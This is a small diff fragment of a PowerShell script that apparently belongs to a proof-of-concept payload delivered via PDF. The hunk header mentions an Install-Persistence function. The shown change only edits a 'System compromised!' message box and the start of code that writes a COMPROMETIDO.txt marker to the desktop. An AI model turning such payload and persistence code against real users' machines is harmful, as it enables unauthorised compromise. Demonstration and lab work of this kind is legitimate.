@@ -35,7 +35,7 @@ function Install-Persistence {
 # ====================================================
 function Show-Payload {
     Add-Type -AssemblyName System.Windows.Forms
-    [System.Windows.Forms.MessageBox]::Show('Ejecutando payload desde PDF... Sistema comprometido!', 'Alerta de Seguridad')
+    [System.Windows.Forms.MessageBox]::Show('Ejecutando cambio de payload... Sistema comprometido!', 'Alerta de Seguridad')
     
     $desktop = [Environment]::GetFolderPath("Desktop")
     $file = "$desktop\COMPROMETIDO.txt"
